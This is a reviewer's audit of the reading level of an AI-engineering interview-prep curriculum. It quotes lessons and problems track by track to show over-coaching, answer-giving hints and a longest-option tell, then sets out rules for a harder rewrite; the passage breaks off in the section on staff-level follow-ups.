# Level audit of the first build

Reviewer's audit of the reading level of the existing lessons and problems. No content files were edited. Written 2026-10-28.

## Scope and method

Read in full: 18 lessons (two per track) and 61 problems (six or seven per track, chosen as the core ones plus every file tagged `hard` in the tracks where I could). Also read `SPEC.md`, `PLAN.md`, the curriculum in `research/brief.json` and the per-track notes in `research/tracks/`. Frontmatter statistics below were computed over all 154 problem files with a script, not sampled.

Two facts about the repository state matter for reading this document.

1. While the audit ran, another workflow step moved every lesson from `src/content/lessons/<track>/<slug>.mdx` to `src/content/lessons/<track>/<module>/overview.mdx` and added `kind` and `level` frontmatter. The lesson bodies are byte-identical apart from import paths and the `SelfRate` id (checked with `diff -w` against `git HEAD`). Paths in this document are the new ones.
2. The same step rewrote the `seniority` line in 104 of 154 problem files, removing `mid`. At `HEAD`, `fnd-003` and `fnd-005` were tagged `seniority: [mid]`; they are now `[senior]` with no change to their bodies. A relabel is not a level change, and this audit judges the bodies.

Every source URL in this document is one already recorded in the repository's lesson frontmatter, problem frontmatter or `research/tracks/*.md`, each marked there as checked on 2026-10-28. This audit did not re-fetch them; "date checked" for every URL below is therefore 2026-10-28, as recorded in the repository. No new numbers are introduced that are not computed in front of the reader from those sources.

## 0. Verdict in brief

The owner's complaint is accurate in a specific way. The sourcing is senior-grade (dated vendor docs, papers, measured token counts), the voice is confident, and the facts are mostly right. The level at which the reader is addressed is not. Three mechanisms pull nearly every file down to mid level:

- The reader is coached rather than tested. Lessons tell the reader what to say in the first sentence of an interview answer and warn which mistake "loses the question". Problems add hints that are the answer, evidence tables that pre-solve debugs, and Depth blocks that leave no decision open.
- Multiple-choice problems carry a tell. In 45 of the 50 problems with `choices`, the correct option is the longest (or tied longest) option. Two files say it outright: "The correct statement is the conditional one" (`fnd-005`), "The correct answer is the conditional one" (`inf-007`). A test-wise reader scores without knowing the material.
- The "In the room" questions are phone-screen questions. "Walk me through self-attention", "Explain how HNSW works", "Why does reordering your prompt change your bill?", "How do you stop one agent run from becoming expensive?". Staff rounds ask for decisions under conflicting constraints, with incomplete evidence and a deadline, and the bank has few of those.

Per level, across the 79 content files read: lessons sit at mid level with senior sourcing; problems are mid with a senior minority (`fnd-008`, `fnd-013`, `api-009`, `api-016`, `evl-012`, `evl-013`, `evl-014`, `rag-004`, `rag-016`, `agt-010`, `agt-011`, `agt-012`, `agt-018`, `sfe-003`, `sfe-011`, `inf-005`, `inf-006`, `inf-014`, `sys-009`, `sys-012`, `rnd-010`); one problem reaches staff by its content (`inf-006`, the paged allocator with copy-on-write) and two more would with their hints removed (`agt-012`, `agt-010`). Nothing in the bank asks the reader to run anything: no labelling operation, no migration under a deadline, no written risk decision, no review of someone else's design.

Bank-wide numbers (computed from frontmatter, all 154 problems): difficulty is 17 easy, 101 medium, 36 hard. Core 100 contains 9 easy problems. The owner's "harness engineering first" complaint is a track gap rather than a level gap: `agents/coding-agents/overview.mdx` is the only lesson about harnesses and `agt-018`, `agt-019` the only problems; the new `SPEC.md` already names a `harness` track in its labs example.

## 1. Per-track verdict

Format for each track: the level the lessons address, the level the problems address, then exact quotes with the file and what each quote gives away. Quotes are verbatim.

### 1.1 foundations

Lessons read: `src/content/lessons/foundations/attention/overview.mdx`, `src/content/lessons/foundations/tokens/overview.mdx`. Problems read: `fnd-003`, `fnd-005`, `fnd-008`, `fnd-009`, `fnd-012`, `fnd-013`.

Verdict: lessons written for mid level (a senior who has read one transformer explainer gets nothing new until the 2024 to 2026 architecture table). Problems: two junior MCQs in Core 100 (`fnd-003`, `fnd-005`), two senior debugs (`fnd-008`, `fnd-013`), two mid estimate and concept problems. Staff: none.

| File | Quote | What it gives away |
|---|---|---|
| foundations/attention/overview.mdx, "A hash map with soft keys" | "Think of a dictionary lookup. You hash a key, find the matching slot, and return its value. Exactly one value comes back, or none." | Explains a hash map to the reader. `PLAN.md` says "Never explain a hash map." |
| foundations/attention/overview.mdx, gotcha callout | "Candidates who mix the two up lose the question in the first sentence." | Coaching against the beginner error; the intended reader is someone who might make it. |
| foundations/attention/overview.mdx, follow-ups | "Is FlashAttention an approximation? No." | A yes/no follow-up with a one-word answer. |
| foundations/tokens/overview.mdx, "A tokenizer is a lexer that was trained, not written" | "You have used a lexer. It takes a character stream and emits symbols: `IDENT`, `NUMBER`, `LPAREN`." | Explains the analogy's source instead of naming it. |
| foundations/tokens/overview.mdx, interview tip | "It is one sentence if you know this lesson." | Positions the lesson as the thing that makes a phone-screen question answerable. |
| foundations/tokens/overview.mdx, gotcha | "Candidates say \"tokens are roughly words\". Interviewers hear \"has never looked\"." | Coaching against a junior answer. |
| foundations/tokens/overview.mdx, "BPE, step by step" | "\"Why not a million-symbol vocabulary?\" is a fair follow-up, and the answer is that rare tokens get too few training examples" | Rhetorical question answered in the same sentence. |
| fnd-003.mdx | `difficulty: easy`, `minutes: 5`, `core: true`; hint 1: "What is the variance of a sum of d_k independent products, each with variance 1?" | The hint is the derivation. The correct option is 169 characters; the three wrong ones are 47, 76 and 76. |
| fnd-005.mdx, Question | The table prints cosine, dot product and L2 for all three documents, and the stem says "\"long\" is \"short\" multiplied by 3." Answer: "The correct statement is the conditional one." | The data in the question already demonstrates the answer; the answer names the tell. |
| fnd-009.mdx, hint 1 | "Count bytes per parameter: half-precision weights, half-precision gradients, and the fp32 copy plus two Adam moments." | The hint is the entire calculation. The problem is tagged `hard` and `[senior, staff]`. |
| fnd-012.mdx, hint 1 | "Does an API accepting 1M tokens tell you how accurately the model uses token 500,000?" | Rhetorical hint whose implied answer is the answer. |
| fnd-008.mdx, Question | "logprobs at token 41 (golden run): \" approved\" -0.6912, \" denied\" -0.6951" plus hint 2 "Look at how close the two candidate tokens are at the first differing position." | Good senior problem whose evidence block does the inference for the reader. Remove the logprob line and make the reader ask for it. |
| fnd-013.mdx | subtitle "the ratio that should be 1"; hint 2 "Which lines run on every step, and which run only once?" | The best foundations problem; the subtitle and hint point at `if old_logp is None`. |

### 1.2 apis

Lessons read: `apis/api-anatomy/overview.mdx`, `apis/context-engineering/overview.mdx`. Problems read: `api-001`, `api-006`, `api-007`, `api-009`, `api-014`, `api-016`.

Verdict: lessons mid; the streaming event table and the spend-cap 429 are the senior content and are buried after basics. Problems: `api-001` is junior and in Core 100; `api-007` is a vocabulary MCQ; `api-009` and `api-016` are senior; nothing staff.

| File | Quote | What it gives away |
|---|---|---|
| apis/api-anatomy/overview.mdx, "A model call is an RPC with three odd properties" | "Treat a chat completion like any remote call you already know, with three differences that change the engineering." then "**It is stateless and you resend everything.**" | Anyone who has shipped a model call knows this; it is the first section. |
| apis/api-anatomy/overview.mdx, "Streaming" | "Streaming exists for the user, not for throughput." | A definition-level claim as a section opener. |
| apis/api-anatomy/overview.mdx, "Rate limits" | "The analogy is a token-bucket rate limiter you may have written for your own API" | Analogy preamble. |
| apis/context-engineering/overview.mdx | "The analogy is a fixed-size buffer that you fill on every call." and "Here is the mechanism in systems terms." | Both are tells that the reader is being walked down to the idea. |
| apis/context-engineering/overview.mdx, "Keeping a long conversation alive" | "**Sliding window.** Keep the last N turns. Trivial and predictable, and it forgets the user's name from turn one." | A list of four memory techniques defined from zero. |
| api-001.mdx | `difficulty: easy`, `core: true`; hint 3: "Bound the loop with `for _ in range(max_pages)` so a server bug cannot keep you calling forever." | A cursor-pagination fold with the loop header given in the hint. The weakest Core 100 problem in the bank. |
| api-007.mdx, choices | The correct option is the only one that mentions "a capped repair loop"; the three wrong options are permutations of the same three mechanisms. | Elimination by wording. |
| api-006.mdx, after the Depth block | "The answer interviewers want has two halves. ... The second, which separates senior answers, is the list of failures that survive it" | Meta-commentary that grades the answer for the reader. |
| api-009.mdx, Question bullets | "Parse a tool's input once, at its `content_block_stop`." "Usage in `message_delta` is cumulative. Report the last value." | A hard code problem whose every test is stated as a rule in the prompt; it is transcription from a spec, not discovery. |
| api-016.mdx | "Interviewers grading this question listen for three things." | Grading commentary in the answer body. Hints: "Swapping the HTTP endpoint is the easy part. What else is provider-specific in a request?" |
| api-014.mdx | "The strongest answers make two moves that weaker ones miss." | Same pattern. |

### 1.3 evals

Lessons read: `evals/eval-thinking/overview.mdx`, `evals/llm-judge/overview.mdx`. Problems read: `evl-001`, `evl-003`, `evl-007`, `evl-012`, `evl-013`, `evl-014`, `evl-017`.

Verdict: the best-reasoned lessons in the set, still addressed to someone who has never run an eval. Problems: `evl-003` and `evl-017` are recall MCQs; `evl-001` is solved by its evidence table; `evl-012`, `evl-013`, `evl-014` are senior. Nothing about the operational side a staff engineer owns (labelling capacity, judge disagreement between experts, what you refuse to gate, cost of the harness).

| File | Quote | What it gives away |
|---|---|---|
| evals/eval-thinking/overview.mdx, "Crash reports before regression tests" | "You already know this loop from ordinary software. When a service starts failing in production, you do not begin by writing a test suite." | Analogy preamble plus an explanation of incident triage. |
| evals/eval-thinking/overview.mdx, interview tip | "Say \"I would read traces\" before you say the word \"metric\"." | Scripted first sentence. |
| evals/eval-thinking/overview.mdx | Heading "## When do you stop reading?"; "If an interviewer hears `gen_ai.system`, they know when you last read the spec." | Rhetorical heading; coaching line. |
| evals/eval-thinking/overview.mdx, "Binary labels, not 1 to 5" | "A Likert scale feels more nuanced, but the nuance is noise: two annotators disagree about the difference between a 3 and a 4" | Explains inter-annotator noise from zero. |
| evals/llm-judge/overview.mdx, Predict | "A broken judge says 'safe' to every answer. What is its raw agreement with the clinicians, in percent?" | Base-rate arithmetic as the lesson's surprise. |
| evals/llm-judge/overview.mdx, "A classifier written in English" | "You would never ship a fraud classifier on the strength of \"it agrees with the analysts 90% of the time\"; you would ask for precision and recall on held-out data." then definitions of TPR and TNR. | Defines precision and recall vocabulary for the reader. |
| evl-001.mdx, Question | "cases that reschedule a booking: 0", "grader validated against human labels: never", "graded PASS: 18". Hint 3: "Which choices can the logs rule out?" | The evidence block is the answer; the reader eliminates rather than diagnoses. |
| evl-003.mdx | "Which one is true?" over four attribute-name claims. | Pure recall of a Development-status spec. |
| evl-017.mdx, hint 1 | "Which of the four needs no model call at all?" | The hint is the answer. |
| evl-007.mdx, Depth long | "What the judge does. It reads an output, and usually the input and some context, and returns a verdict on a criterion." | Definition a senior does not need, tagged `[senior, staff]`. |
| evl-014.mdx, hint 3 | "C(16, 12) = 1,820 and 2^16 = 65,536." | A `hard` estimate reduced to adding five binomial coefficients the hint supplies. The content (paired test beats overlapping intervals) is senior. |
| evl-013.mdx, follow-ups | "A change improves the average but breaks two must-pass cases. Ship? No." | Follow-up answered in one word; no trade-off left. |

### 1.4 rag

Lessons read: `rag/retrieval-foundations/overview.mdx`, `rag/debugging-rag/overview.mdx`. Problems read: `rag-001`, `rag-004`, `rag-010`, `rag-011`, `rag-013`, `rag-014`, `rag-016`.

Verdict: lessons mid; the foundations lesson defines inverted index, bi-encoder, ANN, recall and nDCG before reaching anything a senior search engineer would not know. Problems: `rag-001` and `rag-010` junior; `rag-014` has its bug annotated in the code; `rag-004`, `rag-011`, `rag-016` are senior with hints that remove the thinking.

| File | Quote | What it gives away |
|---|---|---|
| rag/retrieval-foundations/overview.mdx, "Lexical search" | "You already know the inverted index: a map from term to the list of documents containing it, the same structure behind every log search tool you have used." | Explains the analogy's source. |
| rag/retrieval-foundations/overview.mdx, interview tip | "Say \"retrieve, then generate, and I measure the two separately\" in the first sentence." | Scripted first sentence. |
| rag/retrieval-foundations/overview.mdx, "Dense retrieval" | "An embedding model turns text into a fixed-length vector, and similar meanings land near each other." | Definition of an embedding in a track whose prerequisite is the embeddings lesson. |
| rag/retrieval-foundations/overview.mdx, "ANN indexes" | "It is a full table scan: perfect recall, linear cost." | Explains brute-force search. |
| rag/retrieval-foundations/overview.mdx, "Metrics" | "**recall@k**: of all the relevant documents for this query, what fraction are in the top k?" and three more definitions. | Metric definitions for a reader who, per the track order, has already done the evals track. |
| rag/debugging-rag/overview.mdx, Predict | "At most how many of the 8 failures can retrieval and context fixes recover?" with the reveal "17 - 12 = 5". | A subtraction presented as a prediction. |
| rag-001.mdx, hint 2 | "Which metric drops by half when the answer moves from rank 1 to rank 2?" | The hint is the answer. |
| rag-010.mdx, hint 1 | "Where does the meaning of each query live: in its wording or in one exact token?" | Same. |
| rag-014.mdx, Question code | `ordered = sorted(reranked, key=lambda pair: pair[1])` beneath a line commented "higher score is better"; hint 2: "Which way does Python's `sorted` order by default?" | The bug is on the only unusual line, with a comment above it and a hint naming the mechanism. |
| rag-004.mdx, hint 2 and correct option | "Multiply that number by each tenant's share of the table and compare with the log." The correct option contains "about 8% of 40, roughly 3". | The arithmetic is in both the hint and the option text. The underlying content (post-filter after an HNSW scan) is senior. |
| rag-011.mdx, Question | "Reranker p95 latency: 50 ms plus 4 ms per candidate, measured under load (scenario)." Hint 3: "For cost, one candidate is 440 tokens at $0.05 per million." | A `hard` estimate in which every input, including the latency model, is supplied; the reader divides. |
| rag-016.mdx, hints | "Spend the first minutes on requirements", "Draw two paths, the ingestion path and the query path", "Close with evaluation". | Round-structure coaching on a problem attributed to Staff and Principal reports. |

### 1.5 agents

Lessons read: `agents/agent-loop/overview.mdx`, `agents/coding-agents/overview.mdx`. Problems read: `agt-002`, `agt-004`, `agt-007`, `agt-010`, `agt-011`, `agt-012`, `agt-018`.

Verdict: the strongest track for senior problems (`agt-010`, `agt-011`, `agt-012`, `agt-018`) and still mid in delivery: the lesson opens by explaining that an agent is a while loop, and the hard problems carry hints that name the mechanism. `agt-007` is a spec-revision trivia MCQ in Core 100.

| File | Quote | What it gives away |
|---|---|---|
| agents/agent-loop/overview.mdx | Heading "## An agent is a while loop you own" followed by a seven-line loop; "If you have written an interpreter, you have written this shape." | Explains the loop and the analogy's source. |
| agents/agent-loop/overview.mdx, interview tip | "\"Agent or workflow?\" is really \"how much control flow are you willing to hand to the model?\"" | A good line, but it answers the lesson's own interview question in the tip. |
| agents/coding-agents/overview.mdx, Predict | "By what percentage did sandboxing cut permission prompts in Anthropic's internal usage?" | Trivia prediction: a vendor's reported number, not a quantity the reader can reason to. |
| agt-002.mdx, hint 3 | "Look at the `except` branch: can the model tell a permanent error from a transient one?" The correct option's `why` ends "The answer and the fix are unlocked below." | The hint names the bug. |
| agt-007.mdx | Five options, three of which describe the 2025-11-25 revision; "Pick the statement that is accurate for the current MCP revision, 2026-07-28." | Tests whether the reader has read a changelog, not whether they can design with it. |
| agt-004.mdx, hint 3 | "Think about which system has to pause for days and resume." | Points at the refund case's answer. |
| agt-011.mdx, Question code | `claims = verify_jwt(token, IDP_KEYS)   # checks signature and expiry only` and the visible `headers={"Authorization": request.headers["Authorization"]}` | Both defects are annotated or on the only interesting lines; hint 2 "Look at which credential the billing server uses to call the billing API." |
| agt-012.mdx, after Depth | "The detail that separates answers is the re-run on resume." | The content is near staff; the sentence grades it for the reader, and hint 2 "When a paused node resumes, which lines of it run again?" gives it away. |
| agt-018.mdx | "The interviewer is checking whether you go to credentials and blast radius first, or to prompts." | Grading commentary. |
| agt-010.mdx | Hint 1: "List every piece of state the server holds between requests, and decide for each where it goes when there is no session." | The hint is the method; with it removed this problem is at the bar. |

### 1.6 safety

Lessons read: `safety/threat-modeling/overview.mdx`, `safety/guardrails/overview.mdx`. Problems read: `sfe-001`, `sfe-002`, `sfe-003`, `sfe-007`, `sfe-011`, `sfe-012`, `sfe-017`.

Verdict: lessons mid, with the senior content (EchoLeak chain, MCP security page items, CaMeL) placed after definitions of injection, the trifecta and "filters and walls". The lethal trifecta is explained in six files read (`threat-modeling`, `guardrails`, `coding-agents`, `sfe-001`, `sfe-003`, `agt-018`). Problems: `sfe-007` junior; `sfe-012` has both bugs stated in the question; `sfe-003` and `sfe-011` senior.

| File | Quote | What it gives away |
|---|---|---|
| safety/threat-modeling/overview.mdx | "You already know the shape of this bug. SQL injection happens when a program builds a query by pasting user input into code, so the database cannot tell which characters were meant as data." | Explains SQL injection. |
| safety/threat-modeling/overview.mdx, "Direct and indirect injection" | "**Direct** injection is the user's own prompt changing the model's behaviour. **Indirect** injection arrives inside content the model ingests" | Definitions. |
| safety/threat-modeling/overview.mdx, Predict | "In a 2025 study of 16 code-generating models, what share of the packages suggested by the open-source models did not exist?" | Trivia prediction. |
| safety/guardrails/overview.mdx, "Filters and walls" | "A web application has a WAF and it has authorisation. ... Nobody would remove the authorisation check because the WAF looked good in testing." | Analogy preamble for a reader who runs web applications. |
| sfe-007.mdx | "Jailbreaking is crafting input that makes a model ignore its safety training. Three of the statements below describe real techniques correctly. One is false." | Definition plus a pick-the-false-one format in which the false statement is listed first. |
| sfe-002.mdx | Correct option: 158 characters; the others: 102, 96, 89. | Longest-option tell. |
| sfe-012.mdx, Question | "`request.body` is client-controlled. The signed-in user's tenant is available as `request.auth.tenant`, verified from their session token." Code comments: `# from the client`, `# across the whole index`. | Both bugs are stated in prose and annotated in code before the choices. |
| sfe-003.mdx, after Depth | "A strong answer spends one paragraph on the attack and the rest on structure. Interviewers are checking whether you reach for architecture ... before filters." | Grading commentary. |
| sfe-017.mdx, hint 3 | "What is the order: measure, constrain, escalate?" | The hint is the answer's structure. |
| sfe-011.mdx | Hint 1: "What is the smallest capability that still solves \"speed up refunds\"?" | The hint names the counter-proposal. The problem is close to the bar otherwise; see section 5. |

### 1.7 inference

Lessons read: `inference/inference-anatomy/overview.mdx`, `inference/batching/overview.mdx`. Problems read: `inf-001`, `inf-003`, `inf-005`, `inf-006`, `inf-007`, `inf-012`, `inf-014`.

Verdict: the most technically senior lessons, delivered with the same preambles. Problems: `inf-006` is the one problem in the bank at staff level as written; `inf-005` and `inf-014` are senior; `inf-003` is a `hard` estimate whose first hint is the whole problem; `inf-012` is junior.

| File | Quote | What it gives away |
|---|---|---|
| inference/inference-anatomy/overview.mdx, "Two phases, in a systems engineer's terms" | "Think of the model as a function with a very large constant table: the weights." and "That is a full table scan per output row" | Analogy preamble; defines decode as a table scan. |
| inference/inference-anatomy/overview.mdx, "The latency vocabulary" | "**TTFT**, time to first token: from submitting the request to receiving the first token." and three more definitions. | Definitions for a reader who has operated a serving endpoint. |
| inference/inference-anatomy/overview.mdx, gotcha | "Means hide tails." followed by a worked mean-versus-p99 example. | Explains percentiles. |
| inference/batching/overview.mdx, "Static versus continuous batching" | "If you have written a worker pool that pulls the next job the moment a worker is free, you already know the idea." | Analogy preamble. |
| inference/batching/overview.mdx | "It is head-of-line blocking, the same thing that happens when one large message blocks a TCP connection carrying small ones." | Explains head-of-line blocking. |
| inf-003.mdx, hint 1 | "Each decode step must read every weight once. How long does reading 70 GB take?" | The `hard` estimate's hint is the computation; the question also supplies bandwidth, weight size and FP8 so nothing is left to decide. |
| inf-007.mdx, Answer | "The correct answer is the conditional one." | Names the tell. The correct option is 317 characters; the others are 95 to 134. |
| inf-012.mdx | Option E: "Layout does not matter, because the cache matches any repeated span of tokens anywhere in the prompt." | A filler option that no reader of the lesson would pick. |
| inf-014.mdx, Question | The diff changes one engine line, commented `# "raise throughput", per the change request`; the title says "no model change"; the table includes "Preemptions per minute 0 0" and "Prefix cache hit rate 47% 47%". | A good senior incident problem in which the evidence explicitly rules out every wrong option. |
| inf-005.mdx, hint 1 | "There are two triggers for running a batch: it is full, or the oldest request has waited long enough." | The design's key decision, given. |

### 1.8 system-design

Lessons read: `system-design/framework/overview.mdx`, `system-design/capacity/overview.mdx`. Problems read: `sys-001`, `sys-003`, `sys-006`, `sys-009`, `sys-010`, `sys-012`, `sys-013`.

Verdict: the framework lesson is written for someone who has never done a design round. The capacity lesson is senior in its arithmetic and mid in its framing. The hard design problems are complete checklists with a "Rubric check" paragraph each; none contains a constraint conflict the reader must resolve, and none has an operating constraint (team, deadline, existing system, regulator).

| File | Quote | What it gives away |
|---|---|---|
| system-design/framework/overview.mdx, opening | "the candidate says \"sure\", draws a box labelled *vector DB*, another labelled *LLM*, an arrow between them, and starts on chunk sizes." | The cautionary tale is of a junior candidate. |
| system-design/framework/overview.mdx | "You have sat in design reviews. Someone presents, reviewers ask \"what happens when this fails?\"" | Analogy preamble. |
| system-design/framework/overview.mdx, "Driving the interview" | "Say the plan in the first minute: \"I'll spend five minutes on scope, sketch the path, then go deep on retrieval and the refund flow, and finish with evals and failure modes. Stop me if you'd rather go elsewhere.\"" | A script. |
| system-design/framework/overview.mdx, Predict | "Anthropic's research-agent team started its eval set with about how many queries?" | Trivia prediction. |
| system-design/capacity/overview.mdx | "Treat one model call like a parts list." and "**History is re-sent.** A chat API is stateless." | Preamble and a repeat of the apis lesson's first point. |
| sys-003.mdx, hint 3 | "The cache write is 1.25 times the input price and the read 0.1 times, so the prefix costs 0.9 × 0.1 + 0.1 × 1.25 of its uncached price." | The formula, in an `easy` Core 100 estimate. |
| sys-001.mdx, hint 1 | "Before drawing anything, find out whether the assistant only answers or can also act on accounts, and who sees its mistakes." | Scoping coached in the hint. |
| sys-006.mdx, sys-009.mdx, sys-010.mdx, sys-012.mdx | Each ends with a "### Rubric check" paragraph: "**Problem navigation:** asked about permission-change latency and cross-source answers. **Solution design:** the permission filter sits inside retrieval ..." | The answer grades itself against the rubric; nothing is left for the reader to judge. |
| sys-010.mdx, Depth short | "Budget the critical path, not the components: endpointing, transcript, network, model time to first token, TTS first audio, buffering." | A complete answer with no tension; the hard decision (speech-to-speech versus chained, given a moderation requirement) is resolved in one clause. |

### 1.9 rounds

Lessons read: `rounds/hand-write/overview.mdx`, `rounds/ai-collab-coding/overview.mdx`. Problems read: `rnd-005`, `rnd-009`, `rnd-010`, `rnd-012`, `rnd-013`, `rnd-015`, `rnd-016`.

Verdict: mid. The hand-write lesson's invariants table is useful at any level; the practical notes ("ask whether NumPy is allowed") are not. The AI-collab lesson is partly a policy reference. Problems: `rnd-005` and `rnd-013` are trivia MCQs; `rnd-009` is a junior off-by-one in Core 100; `rnd-016` explains STAR; `rnd-010` and `rnd-015` are senior.

| File | Quote | What it gives away |
|---|---|---|
| rounds/hand-write/overview.mdx | "Code in Python unless told otherwise, and ask whether NumPy is allowed; when it is, write the loop version first anyway if you are unsure of the broadcasting" | Advice for someone unsure of broadcasting. |
| rounds/hand-write/overview.mdx, invariants table | "softmax: sums to 1; finite for large inputs" | Junior invariant in a table that also holds senior ones (KV decode equals full recompute). |
| rounds/ai-collab-coding/overview.mdx | "The analogy that works is pair programming with a fast, confident junior who never gets tired and never learns during the session." then five bullet habits beginning "Decompose before prompting." | Habits list for a reader who has not paired with an assistant. |
| rnd-005.mdx | Option: "Top-k sampling with k = 1 gives different output from greedy decoding" | A filler option. |
| rnd-009.mdx | Subtitle "find the pagination bug"; the question gives 1,937 and 1,900; hint 1: "Work out how many pages 1,937 records take at 100 per page, and how big the last one is." | The arithmetic is handed over; `core: true`. |
| rnd-012.mdx, hint 2 | "In an LRU cache, what operations count as a use?" | The hint names the bug. |
| rnd-013.mdx | "Which statement matches what the companies themselves have published?" | Interview policy recall, not engineering. |
| rnd-016.mdx | "Write it in STAR form (situation, task, action, result)" | Explains STAR to a senior candidate. |

## 2. Cross-cutting patterns, with counts

1. Hints that are answers. In the 61 problems read, I found no hint that would be useful to a reader who did not already have the answer in reach and useless to one who did. Hints either name the mechanism (`agt-002` hint 3, `rag-014` hint 2, `rnd-012` hint 2) or give the computation (`fnd-009`, `inf-003`, `rag-011`, `sys-003`, `evl-014`).
2. Evidence that pre-solves. Debug problems supply a table in which every wrong option is contradicted by a labelled row (`evl-001`, `inf-014`, `fnd-008`), or annotate the buggy line with a comment (`rag-014`, `agt-011`, `sfe-012`). The reader eliminates; a staff debug round makes the reader decide what to measure.
3. Longest-option tell: 45 of 50 choice-based problems. The five exceptions are `agt-002`, `api-007`, `api-011`, `rag-017`, `sfe-007`.
4. Grading commentary inside answers: 11 problem files contain "The strongest answers", "listening for", "Interviewers grading", "separates senior answers" or "interviewer is checking". These sentences tell the reader how they are being judged instead of letting the follow-ups do it.
5. Analogy preambles: every lesson read opens its idea section with a sentence of the form "You already know X", "You have used X", "If you have written X, you already know", "Think of X" or "You have sat in X". `SPEC.md` section 9 asks authors to "name the systems analogy, then the difference"; the lessons explain the analogy before naming it.
6. Rhetorical questions as headings and hints: "When do you stop reading?", "Pairwise or pointwise?", "Is 36 enough?", "Is FlashAttention an approximation? No."
7. Follow-ups answered in one line, with no trade-off: "Ship? No." (`evl-013`), "Would a seed help? Not for greedy decoding" (`fnd-008`), "Does a bigger model help? It can refuse more reliably on simple attacks and is also better at decoding the clever ones." (`sfe-007`).
8. Depth blocks that close every decision. The long answer in every design problem read is a complete, tidy architecture. None ends with "and here is what I would give up" as a cost the reader must accept; several end with a self-grading paragraph.
9. Repetition across files, which a senior reader experiences as padding: the KV-bytes formula appears in `attention`, `inference-anatomy`, `capacity` and `hand-write`; the prompt-cache break-even in `context-engineering`, `capacity`, `sys-003` and `inf-012`; the 84% sandbox figure in `coding-agents` and `agt-018`; the lethal trifecta in six files.
10. Core 100 includes 9 easy problems and the 17 easy problems in the bank are mostly vocabulary MCQs. Under the new `SPEC.md` rule "at most one easy per module", at least six of the modules read are over the limit on the files read alone (`attention` has `fnd-003`; `embeddings` `fnd-005`; `api-anatomy` `api-001`; `structured-outputs` `api-007`; `retrieval-foundations` `rag-001`; `hybrid-search` `rag-010`; `hand-write` `rnd-005`; `llm-app-coding` `rnd-009`; `ai-collab-coding` `rnd-013`).

## 3. The level bar for the rewrite

Written as rules an author applies while writing. Intended as the `levelBar` for `research/curriculum-v2.json`, which `SPEC.md` now declares binding.

### 3.1 Who the reader is

A senior or staff software engineer who has shipped production systems and has called a model API in production at least once. Everything below is assumed and is never defined, explained by analogy or introduced with "you already know":

- Distributed systems: queues, backpressure, idempotency keys, retries with jitter, circuit breakers, token-bucket rate limiting, caches and cache keys, consistent hashing, Little's law, percentiles and why means hide tails, head-of-line blocking, at-least-once versus exactly-once delivery.
- Data: indexes and query plans, inverted indexes, ACLs and row-level security, transactions, tombstones and reconciliation, schema migration.
- Web and APIs: HTTP status semantics, SSE and WebSockets, OAuth bearer tokens and audience, JSON Schema, pagination.
- Testing: unit, integration, property-based and differential tests; fixtures; replay testing; canaries and shadow traffic; A/B assignment by stable hash.
- Statistics: base rates, precision and recall, confidence intervals, paired versus unpaired comparisons, the binomial distribution, p-values and their misuse.
- Numerics and hardware: floating-point non-associativity, memory bandwidth versus FLOPs, GiB versus GB.
- ML vocabulary at the definitional level: token, embedding, cosine similarity, attention, softmax, temperature, fine-tuning, loss. The reader may not know how any of these are implemented or what they cost, and that is what the site teaches.
- Interviewing: what a design round, a behavioural round and a take-home are; STAR; that one should clarify requirements before drawing.

If a sentence would be removed from a design document written for a staff engineer on the team, it is removed from the lesson.

### 3.2 What a lesson must do

- Open on the decision or mechanism, not on a scenario about a junior engineer making a mistake. One scenario per track may remain if it is a real public incident with a source (EchoLeak, the Supabase MCP case).
- Name the systems analogy in a clause and move on: "the KV cache is memoisation of per-token keys and values; the difference is that it is per request, grows per token and is evicted by a scheduler". Never explain the analogy's source.
- Spend its words on what the reader does not have: the published numbers with their conditions, what changed in the last 18 months and why, the failure modes seen in production, and the decision procedure.
- Replace every "Predict" block whose answer is a published figure (a vendor's percentage, a count) with one whose answer the reader can derive from inputs on the page (a KV size, a p-value, a break-even).
- Carry one "In the room" question at staff level: a decision under at least two conflicting constraints, with a deadline or a budget, and a follow-up that pushes back on the answer.
- Say what the lesson's model gets wrong ("When this is wrong" stays; it is the most senior section in every lesson read).
- No coaching sentences. No sentence tells the reader what to say first, what interviewers hear, or what loses the question.

### 3.3 What a hard problem must contain

Every problem tagged `hard`, and every problem with `staff` in its seniority, must satisfy all of the following that apply to its type.

All types:

- A decision with at least two defensible answers, each with a stated cost. If only one answer is defensible, the problem is `medium` at most.
- At least one quantity the reader must choose and defend, not one that is given. The accepted answer states which choices are reasonable.
- A constraint conflict: latency against correctness, cost against recall, autonomy against safety, a migration deadline against measured regressions, labelling budget against coverage.
- A failure mode of the recommended answer, stated as part of the answer, not as a follow-up.
- Hints that are questions the reader should ask the interviewer or measurements they should request, never the mechanism or the formula. If a hint would let a reader who has not understood the material answer, delete it.

Debug:

- The defect is not on a commented line, not on the only changed line, and not named in the title or subtitle.
- The evidence is incomplete. At least one piece of information needed to be sure is missing, and the strong answer says what it would collect and what it would do if it could not get it.
- At least one red herring is a real but secondary defect, so the reader must rank, not merely identify.
- Options are within 20 percent of each other in length. The "it depends" option is not reliably correct; sometimes two options are both correct and the stem asks which one changes under a stated constraint.

Code:

- Hidden property tests or invariant tests in addition to visible examples; the visible tests never enumerate every rule of the specification.
- At least one interface or policy decision left to the reader (eviction policy, preemption order, tie-break rule), with tests that check invariants rather than a canonical output.
- A performance or memory constraint that a naive solution fails, within the Pyodide stdlib-only limit.
- A follow-up that asks what the reader would change to run the code in a real engine or client.

Estimate:

- The reader chooses at least one assumption and the accepted band is wide enough to admit reasonable choices, with the answer stating which choices are unreasonable and why.
- The answer must say which term dominates and which assumption flips the conclusion.
- Published inputs carry their source and date; scenario inputs are labelled as scenario.

Design and workflow:

- An operating constraint: team size, deadline, an existing system that cannot be rewritten, a regulator, a budget, or a stakeholder who disagrees.
- A "what you give up" statement in the answer.
- The answer includes something the reader puts in writing: a risk note, a rollout plan with rollback triggers, a decision memo.
- No "Rubric check" paragraph. If the rubric is needed, it is a `checklist` the reader ticks.

Critique:

- The flawed artefact is realistic enough that a reviewer could have approved it: at least two of its flaws are the kind a senior reviewer misses on first read (a provenance leak, an at-least-once side effect, a cache-key omission).
- The checklist has 6 to 12 items and includes at least one item that is a judgement call where the reviewer should say "acceptable if", not "wrong".

### 3.4 What a staff follow-up looks like

Follow-ups are where staff level is tested, and the ones in the bank are senior at best. A staff follow-up has one of these shapes, and each problem at the bar carries at least three of them, at least one from each of the first two groups:

Pushback on the answer:

- "Your verification costs three times the feature. Which half do you cut, and what risk do you accept in writing?"
